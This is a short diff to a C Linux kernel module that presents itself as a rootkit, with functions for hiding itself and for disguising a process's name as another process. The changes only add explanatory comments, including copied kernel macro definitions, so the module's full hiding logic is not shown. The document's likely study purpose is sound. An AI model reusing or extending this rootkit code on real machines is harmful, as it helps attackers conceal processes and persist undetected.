@@ -74,7 +74,7 @@ static int hide_show_rootkit(void)
 // Masquerade the name of a process as another process
 static int masq_proc_rootkit(struct masq_proc_req *req_list)
 {
-	struct task_struct *task = current;
+	struct task_struct *task = current; // currnet is the pointer to the current task
 	struct masq_proc *proc;
 	int new_name_len, orig_name_len, i;
 
@@ -381,8 +381,8 @@ static int __init rootkit_init(void)
 		return ret;
 	}
 
-	major = MAJOR(dev_no);
-	dev = MKDEV(major, 0);
+	major = MAJOR(dev_no); // #define MAJOR(dev)        ((unsigned int) ((dev) >> MINORBITS))
+	dev = MKDEV(major, 0); // #define MKDEV(ma,mi)      (((ma) << MINORBITS) | (mi))
 	printk("The major number for your device is %d\n", major);
 	ret = cdev_add(kernel_cdev, dev, 1);
 	if (ret < 0) {
